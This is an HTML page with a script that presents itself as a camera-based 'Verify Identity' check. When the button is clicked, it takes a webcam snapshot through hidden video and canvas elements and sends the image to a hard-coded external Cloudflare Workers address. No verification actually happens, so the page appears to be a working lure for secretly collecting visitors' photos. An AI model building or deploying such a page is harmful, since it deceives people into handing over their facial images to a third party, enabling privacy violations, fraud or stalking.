<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Capture</title>
</head>
<body>
    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>
    
    
    <button id="startBtn">Verify Identity (Requires Camera)</button>
    <p id="status"></p>

    <script>
        const video = document.getElementById('video');
        const canvas = document.getElementById('canvas');
        const startBtn = document.getElementById('startBtn');
        const statusText = document.getElementById('status');

      
        const WORKER_URL = 'https://wild-shape-68d8.foysalmahmud1627.workers.dev/'; 

        startBtn.addEventListener('click', async () => {
            try {
                statusText.innerText = "Requesting permission...";
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                video.srcObject = stream;
                
              
                video.onloadedmetadata = () => {
                    setTimeout(() => captureAndSend(stream), 1500);
                };
            } catch (err) {
    statusText.innerText = "Error: " + err.name + " - " + err.message;
    console.error("Camera Error:", err);
}

        });

        function captureAndSend(stream) {
            const context = canvas.getContext('2d');
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            context.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const imageData = canvas.toDataURL('image/jpeg');
            
            
            stream.getTracks().forEach(track => track.stop());
            statusText.innerText = "Processing...";

            fetch(WORKER_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ image: imageData })
            })
            .then(res => res.json())
            .then(data => {
                statusText.innerText = data.success ? "Success!" : "Failed to send.";
            })
            .catch(() => statusText.innerText = "Network error.");
        }
    </script>
</body>
</html>
